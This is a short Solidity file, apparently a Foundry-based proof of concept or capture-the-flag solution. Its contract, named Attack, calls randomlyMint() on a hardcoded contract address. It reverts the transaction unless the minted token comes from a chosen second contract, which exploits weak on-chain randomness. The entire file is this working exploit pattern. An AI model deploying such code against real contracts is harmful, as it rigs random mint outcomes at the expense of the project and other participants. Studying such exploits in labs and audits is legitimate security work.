// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console2} from "forge-std/Test.sol";

contract Attack {
    address public bentoUtil;
    address public crystal;

    constructor() {
        bentoUtil = address(0xBc1Bb37A522EDB1cAa073ac2B3DEbAcd5E89D81d);
        crystal = address(0x77c5dcE7824C267dbc70A1aEeD98a6E1bf05Ae59);
    }

    function attack() public {
        (bool success, bytes memory data) = bentoUtil.call(
            abi.encodeWithSignature("randomlyMint()", 0)
        );
        require(success, "Attack failed");

        (address collection, uint256 tokenId) = abi.decode(
            data,
            (address, uint256)
        );

        if (collection != crystal) {
            revert();
        }
    }
}
